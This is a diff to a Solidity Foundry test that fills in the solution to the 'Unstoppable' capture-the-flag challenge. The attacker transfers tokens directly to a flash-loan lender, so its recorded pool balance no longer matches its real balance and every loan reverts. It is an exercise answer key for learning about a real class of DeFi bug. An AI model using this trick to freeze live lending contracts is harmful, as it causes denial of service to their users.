@@ -56,6 +56,14 @@ contract Unstoppable is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+
+        // Note: The exploit depends on someone depositing via the deposit function and if the
+        // storage variable poolBalance doesn't match the balance of the contract, the exploit occurs.
+        // hence sending tokens directly to the contract bricks the flash loan.
+
+        vm.prank(attacker);
+        dvt.transfer(address(unstoppableLender), 10);
+        
         /** EXPLOIT END **/
         vm.expectRevert(UnstoppableLender.AssertionViolated.selector);
         validation();
